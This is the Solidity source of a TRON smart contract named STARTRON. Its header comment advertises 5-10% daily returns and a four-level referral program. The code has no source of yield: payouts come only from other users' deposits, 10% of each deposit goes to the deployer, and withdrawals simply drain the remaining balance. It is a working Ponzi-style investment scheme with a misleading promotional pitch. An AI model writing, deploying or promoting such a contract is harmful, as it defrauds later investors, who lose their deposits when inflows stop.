//SourceUnit: startron.sol

/*
 * 
 *   startron.xyz - Decentralized short-term investments powered by the tron blockchain technology.
 *
 *   Official Launch Date: 00:00 GMT - November 23, 2020
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐  
 *   │   Official Website: https://startron.xyz/                             │
 *   └───────────────────────────────────────────────────────────────────────┘ 
 *
 *   [HOW TO JOIN]
 *
 *   1) Connect TRON browser extension TronLink or TronMask, or mobile wallet apps like TronWallet or Banko.
 *   2) Send any TRX amount (10 TRX minimum) using our website invest button.
 *   3) Wait for your earnings.
 *   4) Withdraw earnings any time using our website "Withdraw" button.
 *
 *   [INVESTMENT PLANS]
 * 
 *   - [I]
 *      - Maximum income  : 300% in 60 Days,  5% Daily ROI
 * 
 *   - [II]
 *      - Maximum income  : 240% in 40 Days, 6% Daily ROI
 * 
 *   - [III]
 *      - Maximum income  : 200% in 25 Days, 8% Daily ROI
 * 
 *   - [IV]
 *      - Maximum income  : 150% in 15 Days, 10% Daily ROI
 * 
 *   [REFERRAL PROGRAM]
 *
 *   Share your referral link with your partners and get additional bonus when they invest!
 *   - 4-level referral commission: 10% - 5% - 3% - 2%
 *
 *   ────────────────────────────────────────────────────────────────────────
 */
 
 

pragma solidity 0.5.9;


contract STARTRON {

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    } 

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint256 time;
    }

    struct Tarif {
        uint16 life_days;
        uint16 percent;
		uint256 value;
    }

    address payable public _self;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
	
	uint public launch_date;
    
    uint8[] public ref_bonuses;

    Tarif[] public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
	
    constructor() public {
	
        _self = msg.sender;

        tarifs.push(Tarif(60, 300, 1e7));
        tarifs.push(Tarif(40, 240, 1e7));
        tarifs.push(Tarif(25, 200, 1e7));
        tarifs.push(Tarif(15, 150, 1e7));
        
        ref_bonuses.push(10);
        ref_bonuses.push(5);
        ref_bonuses.push(3);
        ref_bonuses.push(2);
		
		launch_date = 1606089600;
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = now;
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / 100;
			if(now < launch_date) {
				bonus = _amount * (ref_bonuses[i] + 5) / 100;
			}
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
		
        if(players[_addr].upline == address(0) && _addr != _self) {
			
            if(players[_upline].deposits.length == 0) {
                _upline = _self;
            }
            else {
                players[_addr].direct_bonus += _amount / 100;
                direct_bonus += _amount / 100;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Invalid Tier");
		require(tarifs[_tarif].value <= msg.value, "Invalid Tier Value");

        Player storage player = players[msg.sender];

        require(player.deposits.length <= 200, "Max 200 deposits.");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: (now > launch_date) ? now : launch_date
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        _self.transfer(msg.value / 10);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
	
		require(now >= launch_date);
		
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

		if(amount >= address(this).balance) {
			msg.sender.transfer(address(this).balance);
		} else {
			msg.sender.transfer(amount);
		}
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = now < time_end ? now : time_end;

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[4] memory structure, uint[4][100] memory deposits) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }
		
		for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = now < time_end ? now : time_end;

            if(from < to) {
				deposits[i][2] = time_end - now;
                deposits[i][3] = dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            } else {
				deposits[i][2] = 0;
				deposits[i][3] = 0;
			}
			
			deposits[i][0] = dep.tarif;
			deposits[i][1] = dep.amount;
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure,
			deposits
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus, uint _launch_date) {
        return (invested, withdrawn, direct_bonus, match_bonus, launch_date);
    }
}